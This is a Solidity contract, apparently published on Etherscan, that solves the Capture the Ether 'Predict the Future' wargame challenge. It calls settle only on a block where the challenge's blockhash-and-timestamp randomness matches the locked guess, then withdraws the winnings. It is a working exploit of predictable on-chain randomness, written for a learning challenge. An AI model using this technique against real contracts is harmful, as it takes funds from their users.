/**
 *Submitted for verification at Etherscan.io on 2022-02-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

/// @title Interface for the original challenge contract
/// @notice Only has the functions we need
interface PredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

/// @title The challenge solver
/// @author kyrers
/// @notice This will solve the challenge
/// @dev Implemented using the latest solidity version, hence the differences from the original. Plus, there may be better ways to solve the challenge
contract PredictTheFutureSolver {
    address owner;
    uint8 yourGuess;
    PredictTheFutureChallenge challengeContract;

    /// @notice Contract constructor. Sets the account used to deploy the contract as the owner
    /// @dev There may be a downside to initializing the contract this way that I might not be aware of
    /// @param predictTheFutureChallengeAddress The CTE challenge address
    constructor(address predictTheFutureChallengeAddress) {
        owner = msg.sender;
        challengeContract = PredictTheFutureChallenge(predictTheFutureChallengeAddress);
    }

    /// @notice The function to lock your guess
    /// @param guess Your guess
    function lockGuess(uint8 guess) payable external {
        //Verify that we received 1 ETH with the function call
        require(msg.value == 1 ether, "You did not send 1 ETH");

        yourGuess = guess;

        //Lock your guess
        challengeContract.lockInGuess{value: msg.value}(guess);
    }

    /// @notice The predict function. Verifies that your guess is correct and if it is, calls the settle function
    /// @dev There may be a better way to reach the answer and avoid using uint8(uint(keccak256(...)))
    function predict() external {
        //Verify your guess is correct
        require(yourGuess == uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10, "You will not win if you settle on this block.");

        //Settle the guess
        challengeContract.settle();
    }

    /// @notice The withdraw function that allows you to recover your 2 ETH spent solving the challenge
    function withdraw() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    /// @notice The fallback function, needed to receive the 2 ETH sent by the contract after guessing correctly.
    /// @dev We don't simply send the 2 ETH to our wallet from this function because fallback functions permit only limited operation due to gas limits.
    fallback() external payable { }
}